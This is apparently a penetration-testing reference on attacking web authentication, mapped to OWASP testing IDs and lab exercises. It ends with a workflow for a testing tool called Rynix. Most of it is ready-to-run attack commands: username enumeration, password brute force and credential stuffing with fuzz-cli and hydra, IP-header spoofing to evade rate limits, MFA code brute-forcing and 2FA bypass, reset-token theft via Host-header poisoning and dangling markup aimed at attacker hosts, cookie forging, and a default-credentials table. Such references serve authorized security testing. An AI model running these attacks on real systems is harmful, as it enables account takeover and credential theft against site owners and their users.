---
id: PS-AUTHN
category: Authentication
wstg_refs: [WSTG-ATHN-01, WSTG-ATHN-02, WSTG-ATHN-03, WSTG-ATHN-04, WSTG-ATHN-07]
lab_count: 14
---

# Authentication: Attack Technique Reference

## 1. Detection

### 1A. Identifying Authentication Surfaces

Every application has at least one authentication surface. Map all of them before testing. The primary attack surface is the login form, but supplementary mechanisms (password reset, remember me, account registration, password change) often contain weaker protections and are higher-value targets.

**Login forms:**
```bash
# Find login pages
curl -sk -D- https://target.com/login
curl -sk -D- https://target.com/signin
curl -sk -D- https://target.com/account/login
curl -sk -D- https://target.com/api/auth/login

# Extract form fields and action URL
curl -sk https://target.com/login | grep -iE '<form|<input|action=|name=|type='
```

**Password reset flows:**
```bash
curl -sk -D- https://target.com/forgot-password
curl -sk -D- https://target.com/reset-password
curl -sk -D- https://target.com/account/recovery
```

**Registration / account creation:**
```bash
curl -sk -D- https://target.com/register
curl -sk -D- https://target.com/signup
curl -sk -D- https://target.com/account/create
```

**Password change (authenticated):**
```bash
curl -sk -D- -H "Cookie: session=TOKEN" https://target.com/my-account/change-password
curl -sk -D- -H "Cookie: session=TOKEN" https://target.com/account/password
```

**What to look for on each surface:**
- Form fields: `username`, `password`, `email`, `csrf`, `remember`, `mfa-code`, `token`
- Hidden fields: static CSRF tokens, user IDs, account identifiers
- HTTP method: POST (normal), GET (vulnerability -- credentials in URL/logs)
- Transport: HTTP vs HTTPS (credentials in cleartext = WSTG-ATHN-01)
- Response headers: `Set-Cookie` (session management), `X-Powered-By` (framework fingerprint)
- JavaScript: client-side validation that can be bypassed, API endpoint disclosure

### 1B. Identifying Authentication Type

**Cookie/session-based:**
```bash
# Login and inspect Set-Cookie
curl -sk -D- -X POST -d "username=test&password=test" https://target.com/login
# Look for: Set-Cookie: session=...; Set-Cookie: remember=...; Set-Cookie: JSESSIONID=...
```

**Token-based (JWT):**
```bash
# Login and inspect response body for JWT
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' \
  https://target.com/api/auth/login
# Look for: {"token":"eyJhbGciOi..."} or Authorization: Bearer eyJ...
```

**HTTP Basic:**
```bash
# Check for 401 + WWW-Authenticate header
curl -sk -D- https://target.com/admin/
# Look for: HTTP/1.1 401 Unauthorized + WWW-Authenticate: Basic realm="..."
# Credentials sent as: Authorization: Basic base64(user:pass)
```

**Multi-factor authentication:**
```bash
# After primary login, check if redirect to 2FA page
curl -sk -D- -X POST -d "username=test&password=test" \
  -c cookies.txt https://target.com/login
# Follow redirect:
curl -sk -D- -b cookies.txt https://target.com/login2
# Look for: MFA code input field, SMS/email verification prompt
```

### 1C. Rate Limiting & Lockout Detection

Before launching any brute-force attack, probe the rate limiting and lockout behavior to avoid wasting time or locking accounts.

```bash
# Send 5 rapid failed logins and observe responses
for i in $(seq 1 5); do
  curl -sk -o /dev/null -w "Attempt $i: %{http_code} %{size_download}b %{time_total}s\n" \
    -X POST -d "username=admin&password=wrong$i" https://target.com/login
done
```

**Indicators of lockout:**
- Response changes after N attempts (different message, different status code)
- Message: "Account locked", "Too many attempts", "Try again in X minutes"
- HTTP 429 Too Many Requests
- Increasing response time (artificial delays)
- CAPTCHA appearing after N failures

**Indicators of IP-based rate limiting:**
- All accounts blocked simultaneously from same IP
- Response includes `Retry-After` header
- Lockout resets when using different IP / `X-Forwarded-For` value

---

## 2. Techniques

### 2A. Username Enumeration

Username enumeration exploits observable differences in application responses when a valid vs. invalid username is submitted. Even tiny differences -- a single character in an error message, a few bytes in content length, or milliseconds in response time -- can reliably distinguish valid accounts.

> Lab refs: PS-AUTHN-01, PS-AUTHN-04, PS-AUTHN-05, PS-AUTHN-07

#### Method 1: Error Message Differences

The most direct indicator. Many applications return distinct messages for "username not found" vs. "wrong password."

```bash
# Test with known-invalid username
curl -sk -X POST -d "username=definitelynotauser&password=anything" \
  https://target.com/login

# Test with likely-valid username
curl -sk -X POST -d "username=admin&password=anything" \
  https://target.com/login
```

**What to compare:**
- Full error text: `"Invalid username"` vs. `"Incorrect password"` (obvious)
- Subtle text: `"Invalid username or password."` vs. `"Invalid username or password"` (trailing period)
- HTML structure: different `<div>` class, extra whitespace, different element IDs

**Automated enumeration with fuzz-cli:**
```bash
fuzz-cli -u https://target.com/login -X POST \
  -d "username=FUZZ&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -mr "Incorrect password"
# -mr matches responses containing "Incorrect password" = valid username
```

**Alternative: filter by response size difference:**
```bash
fuzz-cli -u https://target.com/login -X POST \
  -d "username=FUZZ&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -fs 3456
# -fs filters OUT responses with size 3456 (the "invalid username" response size)
# Remaining results = valid usernames (different response size)
```

#### Method 2: HTTP Status Code Differences

Some applications return different status codes: `200` for failed login, `302` for successful login, or `200` for invalid username vs. `401` for valid username with wrong password.

```bash
fuzz-cli -u https://target.com/login -X POST \
  -d "username=FUZZ&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -fc 200
# -fc filters OUT 200 responses -- remaining responses indicate valid usernames
```

#### Method 3: Response Timing

When a valid username is submitted, the server often performs additional work (password hashing, database lookup) that takes measurably longer. The difference can be amplified by submitting an extremely long password (100+ characters), which forces the server to hash the entire input only for valid usernames.

```bash
# Generate a 200-character password for timing amplification
LONG_PASS=$(python3 -c "print('A'*200)")

# Enumerate via timing with fuzz-cli
fuzz-cli -u https://target.com/login -X POST \
  -d "username=FUZZ&password=$LONG_PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -o timing-results.json

# Sort results by response time -- valid usernames will have longer response times
cat timing-results.json | jq -r '.results[] | "\(.input.FUZZ)\t\(.duration/1000000)ms"' | sort -t$'\t' -k2 -n -r | head -20
```

**Bypassing IP-based blocking during enumeration:**
```bash
# Rotate X-Forwarded-For header to bypass IP-based rate limiting
fuzz-cli -u https://target.com/login -X POST \
  -d "username=FUZZ&password=$LONG_PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: FUZZ2" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZ \
  -w <(seq 1 1000 | while read i; do echo "192.168.1.$((i % 255))"; done):FUZZ2 \
  -mode pitchfork
```

#### Method 4: Account Lockout Enumeration

If the application locks accounts after N failed attempts, this itself leaks valid usernames: only valid accounts get locked. Invalid usernames never trigger a lockout message.

```bash
# Send N+1 login attempts per username
# Usernames that trigger "Account locked" are valid
for user in $(cat usernames.txt); do
  for i in $(seq 1 6); do
    curl -sk -X POST -d "username=$user&password=wrong$i" https://target.com/login
  done
  RESP=$(curl -sk -X POST -d "username=$user&password=wrong" https://target.com/login)
  if echo "$RESP" | grep -qi "locked\|too many"; then
    echo "VALID: $user"
  fi
done
```

---

### 2B. Brute Force Attacks

Once valid usernames are identified (or when targeting known accounts), brute-force the password. Success depends on understanding and evading the application's rate limiting, lockout, and CAPTCHA defenses.

> Lab refs: PS-AUTHN-06, PS-AUTHN-13

#### Standard Password Brute Force

```bash
# Simple brute force with fuzz-cli
fuzz-cli -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -fc 200 -fr "Invalid"
# -fc 200 filters failed logins (200 = login page re-rendered)
# -fr "Invalid" filters responses containing "Invalid" (error message)
# Remaining = successful login (typically 302 redirect)
```

**With hydra (multi-protocol):**
```bash
# HTTP POST form
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid username or password"

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-get /admin/
```

#### Credential Stuffing

Uses previously breached username:password pairs. Each credential pair is tried exactly once, so per-account lockout thresholds are never triggered.

```bash
# credential-list.txt format: user:password (one per line)
fuzz-cli -u https://target.com/login -X POST \
  -d "username=USER&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w credential-list.txt:CREDENTIALS \
  -mode pitchfork \
  -fc 200
```

#### IP-Based Rate Limit Bypass

When rate limiting is tied to the client IP address:

```bash
# X-Forwarded-For rotation
fuzz-cli -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: 10.0.0.FUZZ2" \
  -w passwords.txt:FUZZ \
  -w <(seq 1 255):FUZZ2 \
  -mode pitchfork
```

**Other IP spoofing headers to try (test all -- implementation varies):**
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

#### Counter Reset via Valid Login

Some applications reset the failed-attempt counter when a successful login occurs. If you have valid credentials for any account, interleave valid logins between brute-force attempts:

```bash
# Pattern: 2 guesses against target, then 1 valid login to reset counter
curl -sk -X POST -d "username=victim&password=guess1" https://target.com/login
curl -sk -X POST -d "username=victim&password=guess2" https://target.com/login
curl -sk -X POST -d "username=myuser&password=mypass" https://target.com/login  # reset counter
curl -sk -X POST -d "username=victim&password=guess3" https://target.com/login
curl -sk -X POST -d "username=victim&password=guess4" https://target.com/login
curl -sk -X POST -d "username=myuser&password=mypass" https://target.com/login  # reset again
```

#### Multiple Credentials Per Request (JSON Array)

Some APIs accept an array of credentials in a single request, bypassing per-request rate limiting entirely. If the login endpoint parses JSON and does not validate that `password` is a string:

```bash
# Submit multiple passwords in a single request
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":["password1","password2","password3","admin","letmein","123456"]}' \
  https://target.com/api/login

# If successful, the server iterates through the array and one match = login
```

> Lab ref: PS-AUTHN-13

---

### 2C. Account Lockout Bypass

Account lockout is a defense mechanism, but its implementation often introduces enumeration vectors or can be circumvented entirely.

> Lab refs: PS-AUTHN-06, PS-AUTHN-07

#### Determining Lockout Threshold

```bash
# Incrementally test failed logins, checking response after each batch
for i in $(seq 1 20); do
  RESP=$(curl -sk -w "\n%{http_code}" -X POST \
    -d "username=admin&password=wrong$i" https://target.com/login)
  CODE=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | head -n -1)
  echo "Attempt $i: HTTP $CODE"
  if echo "$BODY" | grep -qi "locked\|blocked\|too many\|rate limit"; then
    echo "LOCKOUT triggered at attempt $i"
    break
  fi
done
```

#### Avoiding Lockout via Credential Stuffing

Instead of hammering one account with many passwords, distribute guesses across many accounts. Try a small set of highly likely passwords against a large username list:

```bash
# Try top 3 most common passwords against all discovered usernames
for pass in "password" "123456" "admin"; do
  fuzz-cli -u https://target.com/login -X POST \
    -d "username=FUZZ&password=$pass" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w valid-usernames.txt \
    -fc 200 -fr "Invalid"
done
```

Since each username receives only a few attempts, per-account lockout thresholds are never reached.

#### Lockout Duration Testing

```bash
# After triggering lockout, probe at intervals to measure duration
echo "Lockout triggered at $(date)"
for delay in 60 120 300 600 900 1800; do
  sleep $delay
  RESP=$(curl -sk -X POST -d "username=admin&password=test" https://target.com/login)
  if echo "$RESP" | grep -qi "locked"; then
    echo "Still locked after ${delay}s"
  else
    echo "Lockout expired after ${delay}s"
    break
  fi
done
```

---

### 2D. 2FA / MFA Bypass

Multi-factor authentication adds a second verification step, but implementation flaws often allow it to be bypassed entirely. The most common flaws are: failing to enforce the second step, failing to bind the MFA verification to the authenticated user, and allowing brute-force of short codes.

> Lab refs: PS-AUTHN-02, PS-AUTHN-08, PS-AUTHN-14

#### Method 1: Direct Navigation (Skipping 2FA)

After completing the first authentication step (username + password), the server may set a session cookie and redirect to a 2FA page. If the application does not verify that 2FA was actually completed, navigating directly to a protected page bypasses MFA entirely.

```bash
# Step 1: Login with valid credentials
curl -sk -D- -X POST -d "username=victim&password=password" \
  -c cookies.txt https://target.com/login
# Response: 302 -> /login2 (2FA page)

# Step 2: Skip the 2FA page -- go directly to a protected resource
curl -sk -D- -b cookies.txt https://target.com/my-account
# If the application returns the account page = 2FA bypass confirmed
```

**What to check:**
- Does the session cookie issued after step 1 already grant authenticated access?
- Are there separate authorization checks for "password verified" vs. "MFA verified"?
- Can you access any protected endpoint before completing step 2?

#### Method 2: User Identity Mismatch (Broken Logic)

A critical vulnerability occurs when the 2FA verification step does not confirm it is the same user who completed step 1. The application may use a cookie or hidden field to track which user's 2FA code to verify. If this can be modified, an attacker can:

1. Log in with their own credentials (step 1)
2. Receive a 2FA code (for their own account)
3. Modify the user identifier to point to the victim's account
4. Submit any code (or brute-force the code) against the victim's account

```bash
# Step 1: Login with attacker's credentials
curl -sk -D- -X POST -d "username=attacker&password=attackerpass" \
  -c cookies.txt https://target.com/login
# 302 -> /login2

# Step 2: On the 2FA page, check for user-identifying cookies or parameters
curl -sk -D- -b cookies.txt https://target.com/login2
# Look for: Cookie: verify=attacker, or hidden input with username

# Step 3: Modify the user identifier to victim and submit a code
curl -sk -D- -b cookies.txt \
  -H "Cookie: session=...; verify=victim" \
  -X POST -d "mfa-code=1234" \
  https://target.com/login2

# If the code is wrong: brute-force 0000-9999 against the victim's account
```

#### Method 3: Brute-Forcing MFA Codes

4-digit codes have only 10,000 possibilities. 6-digit codes have 1,000,000 but may still be feasible if there is no lockout after incorrect attempts.

```bash
# Generate all 4-digit codes
seq -w 0000 9999 > mfa-codes.txt

# Brute-force with fuzz-cli
fuzz-cli -u https://target.com/login2 -X POST \
  -d "mfa-code=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=SESSION_COOKIE; verify=victim" \
  -w mfa-codes.txt \
  -fc 200
# 302 response = correct code
```

**Handling automatic logout after incorrect attempts:**

Some applications log the user out after N incorrect MFA attempts. The counter resets on re-login, so automate the full login -> MFA attempt cycle as a macro:

```bash
# Script: automated re-login + MFA brute-force
for code in $(cat mfa-codes.txt); do
  # Re-login to get a fresh session
  SESSION=$(curl -sk -X POST -d "username=victim&password=password" \
    -c - https://target.com/login | grep session | awk '{print $NF}')

  # Try the MFA code
  RESP=$(curl -sk -w "%{http_code}" -o /dev/null \
    -H "Cookie: session=$SESSION" \
    -X POST -d "mfa-code=$code" \
    https://target.com/login2)

  if [ "$RESP" = "302" ]; then
    echo "FOUND: MFA code = $code"
    break
  fi
done
```

> Lab ref: PS-AUTHN-14

#### Method 4: MFA Code Reuse

Test whether a previously used MFA code can be reused:

```bash
# Use a valid code
curl -sk -X POST -d "mfa-code=1234" -H "Cookie: session=..." \
  https://target.com/login2
# Log out
curl -sk -b cookies.txt https://target.com/logout
# Re-login and try the same code
curl -sk -X POST -d "username=user&password=pass" -c cookies.txt https://target.com/login
curl -sk -X POST -d "mfa-code=1234" -b cookies.txt https://target.com/login2
# If successful = code reuse vulnerability
```

---

### 2E. Password Reset Attacks

Password reset flows are often a weaker entry point than the login form itself. They involve token generation, email delivery, and a reset form -- each step can have vulnerabilities.

> Lab refs: PS-AUTHN-03, PS-AUTHN-11

#### Method 1: Broken Reset Logic (Token Not Validated)

Test whether the password reset form actually validates the reset token, or whether you can reset any user's password by manipulating the username parameter:

```bash
# Step 1: Request a password reset for your own account
curl -sk -X POST -d "username=attacker" https://target.com/forgot-password
# Receive email with reset link: /reset?token=abc123

# Step 2: Use the reset form, but change the username to the victim
curl -sk -X POST -d "token=abc123&username=victim&new-password=hacked123" \
  https://target.com/reset-password

# Step 3: If successful, try logging in as victim with the new password
curl -sk -X POST -d "username=victim&password=hacked123" https://target.com/login
```

**Variations to test:**
- Remove the token parameter entirely
- Set the token to empty string
- Use an expired/used token with a different username
- Modify a hidden `username` field in the reset form

#### Method 2: Host Header Poisoning (Password Reset Poisoning)

If the application constructs the password reset URL using the `Host` header (or similar headers), an attacker can inject a malicious domain. The victim clicks the poisoned link, and the attacker's server receives the reset token.

```bash
# Standard reset request with poisoned Host header
curl -sk -X POST \
  -H "Host: attacker-server.com" \
  -d "username=victim" \
  https://target.com/forgot-password

# Alternative: X-Forwarded-Host (supported by many reverse proxies)
curl -sk -X POST \
  -H "X-Forwarded-Host: attacker-server.com" \
  -d "username=victim" \
  https://target.com/forgot-password

# Other headers that may influence URL generation:
# X-Host: attacker-server.com
# X-Forwarded-Server: attacker-server.com
# Forwarded: host=attacker-server.com
```

**What happens:** The victim receives an email with a reset link pointing to `https://attacker-server.com/reset?token=VALID_TOKEN`. When they click it, the attacker captures the token from the request to their server.

**Verification:** Set up a listener and check if the token arrives:
```bash
# On attacker server, listen for incoming requests
python3 -m http.server 80
# Or use a OOB callback probe / webhook.site URL as the host
```

> Lab ref: PS-AUTHN-11

#### Method 3: Token Predictability

Analyze the reset token structure for predictable patterns:

```bash
# Request multiple reset tokens and compare
for i in $(seq 1 5); do
  curl -sk -X POST -d "username=attacker" https://target.com/forgot-password
  sleep 1
done
# Check email: are tokens sequential? timestamp-based? short?
```

**Token weakness indicators:**
- Short tokens (< 20 characters): susceptible to brute force
- Sequential or timestamp-based: predictable
- Same token on repeated requests: static / no expiry
- Base64 of known values: decode and analyze components

#### Method 4: Dangling Markup Injection

If the password reset email reflects user-controllable input and the email client renders HTML, inject markup to exfiltrate content:

```bash
# Inject HTML that captures the reset link via an img/link tag
curl -sk -X POST \
  -d 'username=victim"<a href="https://attacker.com/?leak=' \
  https://target.com/forgot-password
# If the email renders: the reset token following the injection may be appended to the attacker's URL
```

---

### 2F. Stay-Logged-In / Remember Me Cookies

"Remember me" cookies that persist sessions across browser restarts often use predictable constructions that can be brute-forced offline or forged.

> Lab refs: PS-AUTHN-09, PS-AUTHN-10

#### Step 1: Analyze Cookie Structure

```bash
# Login with "remember me" enabled
curl -sk -D- -X POST \
  -d "username=testuser&password=testpass&remember=on" \
  https://target.com/login
# Extract the stay-logged-in cookie from Set-Cookie header

# Decode base64
echo "dGVzdHVzZXI6MTY4MDAwMDAwMDpNRDVIQVNI" | base64 -d
# May reveal: testuser:1680000000:MD5HASH
```

**Common constructions:**
- `base64(username:timestamp:hash)`
- `base64(username:md5(password))`
- `base64(username:sha256(password))`
- `hex(username) + hex(md5(password))`

#### Step 2: Offline Brute-Force the Hash Component

Once you know the cookie structure and hash algorithm, brute-force the password offline without making any requests to the target:

```bash
# If cookie = base64(username:md5(password))
# Extract the hash
HASH=$(echo "dGVzdHVzZXI6NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk=" | base64 -d | cut -d: -f2)

# Brute-force with hashcat
hashcat -m 0 -a 0 "$HASH" /usr/share/wordlists/rockyou.txt

# Or check against known MD5 databases
curl -sk "https://api.nitrxgen.net/md5/$HASH"
```

#### Step 3: Forge a Cookie for a Target User

Once you know the construction formula, forge a cookie for any user whose username you know (even without their password, if you can brute-force the hash):

```bash
# If construction is base64(username:md5(password)) and you cracked the hash
# or if you know a user's password from another source:
FORGED=$(echo -n "admin:$(echo -n 'admin' | md5sum | cut -d' ' -f1)" | base64)
curl -sk -H "Cookie: stay-logged-in=$FORGED" https://target.com/my-account
```

#### Step 4: XSS-Based Cookie Theft

If the application has an XSS vulnerability, chain it with the remember-me cookie to steal persistent credentials:

```bash
# If XSS exists, inject a payload that exfiltrates the stay-logged-in cookie
# The stolen cookie can be decoded offline to extract the password hash
# This is more valuable than a session cookie because it persists indefinitely
```

---

### 2G. Password Change Exploitation

Password change forms may be accessible without re-authentication or may leak valid usernames through error message differences.

> Lab ref: PS-AUTHN-12

#### Brute-Force via Password Change

If the password change form reveals whether the current password is correct (different error for "wrong current password" vs. "new passwords don't match"), it can be used as a brute-force oracle:

```bash
# Test: submit with intentionally mismatched new passwords
# If "current password is wrong" -> password guess is incorrect
# If "new passwords don't match" -> current password is CORRECT (enumerated!)

fuzz-cli -u https://target.com/change-password -X POST \
  -d "username=victim&current-password=FUZZ&new-password-1=newpass1&new-password-2=newpass2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=ATTACKER_SESSION" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -mr "New passwords do not match"
# Match on "don't match" = correct current password found
```

#### Username Manipulation

If the password change form includes a `username` field (even as a hidden parameter), test whether you can change another user's password:

```bash
# Intercept the password change request and modify the username
curl -sk -X POST \
  -H "Cookie: session=ATTACKER_SESSION" \
  -d "username=victim&current-password=password&new-password-1=hacked&new-password-2=hacked" \
  https://target.com/change-password
```

---

## 3. Default Credentials Reference

Always test default credentials early. Many applications ship with admin accounts that are never changed.

### Common Combinations

| Username | Password | Context |
|----------|----------|---------|
| admin | admin | Generic admin panels |
| admin | password | Generic admin panels |
| admin | admin123 | Generic admin panels |
| administrator | administrator | Windows/IIS/ASP.NET |
| root | root | Linux services, databases |
| root | toor | Kali Linux default |
| test | test | Development/staging instances |
| guest | guest | Guest accounts |
| user | user | Low-privilege accounts |
| demo | demo | Demo instances |
| tomcat | tomcat | Apache Tomcat |
| tomcat | s3cret | Apache Tomcat |
| manager | manager | Apache Tomcat Manager |
| admin | changeme | Various applications |
| postgres | postgres | PostgreSQL |
| sa | (empty) | MSSQL (old default) |
| admin | (empty) | Routers, IoT, basic panels |
| cisco | cisco | Cisco devices |

### Framework-Specific Defaults

```bash
# WordPress: try wp-admin with common creds
curl -sk -X POST -d "log=admin&pwd=admin" https://target.com/wp-login.php

# Drupal: admin / admin
curl -sk -X POST -d "name=admin&pass=admin&form_id=user_login_form" https://target.com/user/login

# Joomla: admin / admin
curl -sk -X POST -d "username=admin&passwd=admin" https://target.com/administrator/

# Spring Boot Actuator: no auth or default
curl -sk https://target.com/actuator/env

# Jenkins: admin / admin or no auth
curl -sk https://target.com/manage

# phpMyAdmin: root / (empty)
curl -sk -X POST -d "pma_username=root&pma_password=" https://target.com/phpmyadmin/
```

**Automated testing with hydra:**
```bash
# Test all common default creds against a login form
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"
# -C uses colon-separated user:pass file
```

---

## 4. Authentication Bypass Techniques

Beyond brute-force and credential attacks, authentication can sometimes be bypassed entirely through logic flaws and direct access.

### 4A. Forced Browsing

Access protected pages directly without authenticating:

```bash
# Try accessing admin/internal pages without session cookie
curl -sk https://target.com/admin/
curl -sk https://target.com/admin/dashboard
curl -sk https://target.com/admin/users
curl -sk https://target.com/api/admin/config
curl -sk https://target.com/internal/debug
curl -sk https://target.com/console

# Check for 200 OK (accessible) vs. 302/401/403 (protected)
```

### 4B. HTTP Method Override

Some authentication checks only apply to specific HTTP methods. Switch from GET to POST or vice versa, or use method override headers:

```bash
# If GET /admin returns 403, try other methods
curl -sk -X POST https://target.com/admin/
curl -sk -X PUT https://target.com/admin/
curl -sk -X PATCH https://target.com/admin/

# Method override headers
curl -sk -X POST -H "X-HTTP-Method-Override: GET" https://target.com/admin/
curl -sk -X POST -H "X-Method-Override: GET" https://target.com/admin/
curl -sk -X GET -H "X-Original-Method: POST" https://target.com/admin/delete-user
```

### 4C. Cookie / Parameter Manipulation

```bash
# Test for role-based cookies or parameters
curl -sk -H "Cookie: session=...; role=admin" https://target.com/admin/
curl -sk -H "Cookie: session=...; isAdmin=true" https://target.com/admin/
curl -sk -H "Cookie: session=...; access_level=9" https://target.com/admin/

# Hidden form field manipulation (if role is in a POST body)
curl -sk -X POST -d "username=user&role=admin" https://target.com/api/update-profile
```

### 4D. Path Traversal Past Auth Checks

If authentication middleware only checks specific path prefixes, path traversal characters may bypass it:

```bash
# Standard path
curl -sk https://target.com/admin/users     # 403

# Bypass attempts
curl -sk https://target.com/ADMIN/users     # case variation
curl -sk https://target.com/admin/../admin/users  # path traversal
curl -sk https://target.com//admin/users    # double slash
curl -sk https://target.com/./admin/users   # dot segment
curl -sk https://target.com/admin/users;.js # path parameter injection (Tomcat)
curl -sk https://target.com/admin%2fusers   # URL-encoded slash
curl -sk https://target.com/admin/users%00  # null byte (legacy servers)
```

---

## 5. Testing Payloads

### 5A. Username Enumeration Wordlists

**Sources (pre-installed in SecLists):**
```
/usr/share/seclists/Usernames/top-usernames-shortlist.txt     # 17 common usernames
/usr/share/seclists/Usernames/Names/names.txt                  # 10,000+ first names
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt # massive list
```

**Quick enumeration list (start with these):**
```
admin
administrator
root
user
test
guest
info
support
webmaster
postmaster
contact
sales
dev
developer
api
system
service
```

### 5B. Password Wordlists

**Sources (pre-installed):**
```
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Common-Credentials/100k-most-common.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/wordlists/rockyou.txt
```

**Quick password list (top 20 -- always test these first):**
```
password
123456
12345678
qwerty
abc123
monkey
1234567
letmein
trustno1
dragon
baseball
iloveyou
master
sunshine
ashley
bailey
passw0rd
shadow
123123
654321
```

### 5C. 2FA Brute-Force Ranges

```bash
# 4-digit codes (most common)
seq -w 0000 9999 > 4digit-codes.txt    # 10,000 possibilities

# 6-digit codes
seq -w 000000 999999 > 6digit-codes.txt  # 1,000,000 possibilities

# Common first-guess codes
echo -e "000000\n111111\n123456\n654321\n000001\n999999\n112233\n121212" > common-mfa.txt
```

### 5D. IP Spoofing Headers for Rate Limit Bypass

Test all of these headers -- different applications trust different headers:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
X-Azure-ClientIP: 127.0.0.1
```

---

## 6. WAF / Protection Bypass

### 6A. CAPTCHA Bypass

```bash
# Check if CAPTCHA is enforced server-side
# Submit login without the CAPTCHA parameter
curl -sk -X POST -d "username=admin&password=test" https://target.com/login
# If accepted without CAPTCHA = client-side only

# Submit with empty CAPTCHA
curl -sk -X POST -d "username=admin&password=test&captcha=" https://target.com/login

# Submit with a static known CAPTCHA value (some implementations reuse)
curl -sk -X POST -d "username=admin&password=test&captcha=12345" https://target.com/login
```

### 6B. Account Lockout Bypass via Null / Alternate Usernames

```bash
# Some lockout implementations fail on edge cases
curl -sk -X POST -d "username=admin%00&password=test" https://target.com/login  # null byte
curl -sk -X POST -d "username=admin+&password=test" https://target.com/login   # trailing space
curl -sk -X POST -d "username=ADMIN&password=test" https://target.com/login    # case variation
curl -sk -X POST -d "username=+admin&password=test" https://target.com/login   # leading space
```

### 6C. Detecting Account Lockout State

After triggering lockout, observe whether:
- Lockout applies per-account or per-IP
- Lockout duration is fixed or exponential
- Lockout applies to all auth mechanisms (login + API + password change) or just one
- A valid login on the locked account produces a different response than an invalid one (information leak)

---

## 7. HTTP Basic Authentication

HTTP Basic auth sends `base64(username:password)` in the `Authorization` header with every request. It lacks CSRF protection, session management, and typically has no lockout mechanism.

**Testing:**
```bash
# Decode existing credentials from captured traffic
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# admin:password

# Brute-force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-get /admin/

# Brute-force with fuzz-cli
fuzz-cli -u https://target.com/admin/ \
  -H "Authorization: Basic FUZZ" \
  -w <(while read p; do echo -n "admin:$p" | base64; done < passwords.txt) \
  -fc 401
```

**Vulnerabilities specific to HTTP Basic:**
- No CSRF protection: cross-origin requests can include the Authorization header if previously cached
- Credential caching: browsers cache Basic auth credentials for the session
- No logout mechanism: credentials persist until the browser is closed
- Cleartext transmission: base64 is encoding, not encryption -- interceptable via MitM if not HTTPS
## Rynix workflow

1. `get_technique_guide` for `authentication` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `auth_login`, `compare_role_response`, `http_probe`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `auth_login`
- `compare_role_response`
- `http_probe`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

